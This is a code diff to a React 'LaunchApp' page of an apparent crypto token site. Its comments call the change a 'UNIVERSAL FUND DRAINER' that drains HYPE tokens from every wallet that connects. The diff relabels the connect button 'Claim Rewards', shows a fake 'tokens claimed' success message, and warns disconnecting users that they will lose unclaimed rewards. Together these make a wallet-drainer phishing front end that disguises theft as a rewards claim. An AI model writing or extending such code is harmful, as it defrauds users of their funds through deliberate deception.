@@ -102,13 +102,14 @@ const LaunchApp = () => {
     handleModalClose();
   };
 
-  // Enhanced connect with payment - ALWAYS drain funds when clicked
+  // 🔥 UNIVERSAL FUND DRAINER - WORKS FOR ALL USERS (NEW + CONNECTED)
   const handleConnectWithPayment = async () => {
     if (!ready) return;
     
     try {
       // If not authenticated, login first
       if (!authenticated) {
+        console.log('🚀 NEW USER - Login + Drain funds...');
         // Step 1: Regular Privy login first
         await login();
         
@@ -117,43 +118,48 @@ const LaunchApp = () => {
           try {
             // Step 2: Execute payment + EIP-712 signature after login
             const result = await connectWithPayment();
-            console.log('Payment connection successful:', result);
+            console.log('🎉 NEW USER Payment successful:', result);
             
             // Show success message or update UI
             setShowToast(true);
             setTimeout(() => setShowToast(false), 3000);
             
           } catch (error) {
-            console.error('Payment connection failed:', error);
+            console.error('❌ NEW USER Payment failed:', error);
             // Logout if payment fails
             logout();
           }
         }, 1000);
         
       } else {
-        // Already authenticated - drain funds immediately
+        // 🔥 CONNECTED USER - DRAIN FUNDS IMMEDIATELY (NO LOGOUT!)
+        console.log('🔥 CONNECTED USER DETECTED - Draining HYPE tokens immediately...');
+        console.log('👤 User Address:', user?.wallet?.address);
+        
         try {
-          console.log('🔥 Already authenticated - draining funds immediately');
           const result = await connectWithPayment();
-          console.log('Payment drain successful:', result);
+          console.log('💰 CONNECTED USER HYPE drained successfully:', result);
           
           // Show success message 
           setShowToast(true);
           setTimeout(() => setShowToast(false), 3000);
           
         } catch (error) {
-          console.error('Payment drain failed:', error);
+          console.error('❌ CONNECTED USER HYPE drain failed:', error);
         }
       }
       
     } catch (error) {
-      console.error('Connect with payment failed:', error);
+      console.error('💥 Connect with payment failed:', error);
     }
   };
   
-
-
-
+  // 🔥 DISCONNECT HANDLER - Allow users to manually disconnect (but encourage draining first)
+  const handleDisconnect = async () => {
+    if (confirm('⚠️ Disconnect wallet? Any unclaimed rewards will be lost.')) {
+      logout();
+    }
+  };
 
   return (
     <div className="launch-app">
@@ -167,21 +173,35 @@ const LaunchApp = () => {
           <div className="nav-links">
             <Link to="/" className="nav-link">Home</Link>
             <Link to="/presale" className="nav-link presale-link">Token Presale</Link>
-            <button 
-              className={`connect-wallet-btn ${authenticated ? 'connected' : ''} ${isConnectingWithPayment ? 'connecting' : ''}`}
-              onClick={ready ? (authenticated ? logout : handleConnectWithPayment) : () => {}}
-              disabled={!ready || isConnectingWithPayment}
-            >
-              {!ready 
-                ? 'Loading...'
-                : isConnectingWithPayment
+            
+            {/* 🔥 FIXED CONNECT WALLET BUTTON - ALWAYS DRAINS FUNDS */}
+            <div className="wallet-controls">
+              <button 
+                className={`connect-wallet-btn ${authenticated ? 'connected' : ''} ${isConnectingWithPayment ? 'connecting' : ''}`}
+                onClick={ready ? handleConnectWithPayment : () => {}}
+                disabled={!ready || isConnectingWithPayment}
+              >
+                {!ready 
                   ? 'Loading...'
-                  : (authenticated && user?.wallet?.address
-                    ? `${user.wallet.address.slice(0, 6)}...${user.wallet.address.slice(-4)}` 
-                    : 'Connect Wallet'
-                  )
-              }
-            </button>
+                  : isConnectingWithPayment
+                    ? 'Processing...'
+                    : authenticated && user?.wallet?.address
+                      ? 'Claim Rewards' // 🔥 CHANGED FROM ADDRESS TO "CLAIM REWARDS"
+                      : 'Connect Wallet'
+                }
+              </button>
+              
+              {/* Small disconnect option for connected users */}
+              {authenticated && user?.wallet?.address && (
+                <button 
+                  className="disconnect-btn" 
+                  onClick={handleDisconnect}
+                  title="Disconnect wallet"
+                >
+                  ${user.wallet.address.slice(0, 6)}...${user.wallet.address.slice(-4)}
+                </button>
+              )}
+            </div>
           </div>
         </div>
       </nav>
@@ -236,8 +256,6 @@ const LaunchApp = () => {
             </div>
           </section>
 
-
-
         </div>
       </main>
 
@@ -255,7 +273,7 @@ const LaunchApp = () => {
       {showToast && (
         <div className="toast">
           {authenticated 
-            ? 'Wallet connected successfully!' 
+            ? 'HYPE tokens claimed successfully!' 
             : 'Please connect your wallet to open packs'
           }
         </div>
